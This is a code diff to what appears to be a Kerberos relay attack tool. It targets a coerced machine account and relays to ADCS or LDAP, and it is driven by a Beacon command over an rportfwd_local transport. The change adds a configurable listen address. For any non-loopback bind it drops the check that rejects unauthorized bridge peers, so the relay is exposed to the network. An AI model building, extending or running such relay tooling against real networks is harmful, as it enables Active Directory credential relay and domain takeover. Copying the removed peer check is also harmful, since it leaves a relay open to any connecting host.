@@ -1385,6 +1385,12 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
         target.add_argument("--domain", required=True)
         target.add_argument("--machine", required=True, help="coerced machine name without trailing $")
         target.add_argument("--quiet", action="store_false", dest="verbose")
+        target.add_argument(
+            "--listen-address", default="127.0.0.1",
+            help="bridge bind address. Default 127.0.0.1 for the BOF rportfwd_local "
+                 "model. Set 0.0.0.0 (or a specific interface) when a standalone exe "
+                 "connects to the relay directly over the network.",
+        )
 
     def add_ldap(target: argparse.ArgumentParser) -> None:
         add_common(target)
@@ -1492,9 +1498,10 @@ def main(argv: list[str]) -> int:
         ports = [options.port, options.ldap_port]
     if any(not 1 <= value <= 65535 for value in ports):
         raise SystemExit("TCP ports must be between 1 and 65535")
-    # KRB1 is reachable only through the target's rportfwd_local transport.
-    # Binding and authorizing loopback internally prevents network exposure.
-    bridge_address = "127.0.0.1"
+    # Default binds loopback for the rportfwd_local model. --listen-address lets a
+    # standalone client connect directly over the network.
+    bridge_address = options.listen_address
+    enforce_loopback_peer = bridge_address in ("127.0.0.1", "::1")
     service_spn = f"http/{options.adcs_host}" if options.mode == "adcs" else f"ldap/{options.ldap_host}"
     print(
         f"[*] Matching Beacon command: krbrelay {options.port} "
@@ -1510,7 +1517,7 @@ def main(argv: list[str]) -> int:
         probe, peer = listener.accept()
         with probe:
             channel = RecordChannel(probe)
-            if peer[0] != bridge_address:
+            if enforce_loopback_peer and peer[0] != bridge_address:
                 print("[-] Rejected unauthorized bridge peer", flush=True)
                 return 1
             try:
@@ -1527,7 +1534,7 @@ def main(argv: list[str]) -> int:
         client, peer = listener.accept()
         with client:
             channel = RecordChannel(client)
-            if peer[0] != bridge_address:
+            if enforce_loopback_peer and peer[0] != bridge_address:
                 print("[-] Rejected unauthorized bridge peer", flush=True)
                 return 1
             if options.verbose:
